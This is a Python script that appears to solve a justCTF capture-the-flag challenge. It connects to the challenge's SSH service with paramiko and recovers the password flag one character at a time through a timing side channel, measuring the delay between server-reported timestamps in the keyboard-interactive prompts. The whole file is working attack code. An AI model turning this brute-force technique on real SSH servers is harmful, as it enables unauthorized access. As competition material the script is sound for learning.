#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from datetime import datetime, timedelta

import paramiko
from pwn import *

conn = {
    "host": "hasshing.nc.jctf.pro",
    "user": "ctf",
    "port": 1337,
}

charset = "0123456789CFT_cdhjlnstuw{}"
passwd = "justCTF{s1d3ch4nn3ls_4tw_79828"
index = 0
index = charset.index("}")


def parse_timestamp(s):
    tm = " ".join(s.split(" ")[:2])
    dt = datetime.strptime(tm, "[%Y-%m-%d %H:%M:%S.%f]")
    return dt


def handler(title, instructions, prompt_list):
    global passwd
    global index
    global prog
    prog.status(f"{passwd}{charset[index]}")
    if "keyboard-interactive authentication mode" in title:
        return [passwd + charset[index]]
    start = parse_timestamp(title)
    end = parse_timestamp(instructions)
    delta = end - start
    expected = timedelta(seconds=0.05 * (len(passwd) + 2))
    if delta > expected:
        passwd += charset[index]
    else:
        index += 1
        index %= len(charset)
    return [passwd + charset[index]]


prog = log.progress("flag")

while True:
    ssh = None
    try:
        ssh = paramiko.Transport((conn["host"], conn["port"]))
        ssh.start_client()
        ssh.auth_interactive(username=conn["user"], handler=handler)
        passwd += charset[index]
        prog.success(passwd)
        quit()
    except KeyboardInterrupt:
        prog.success(passwd)
        quit()
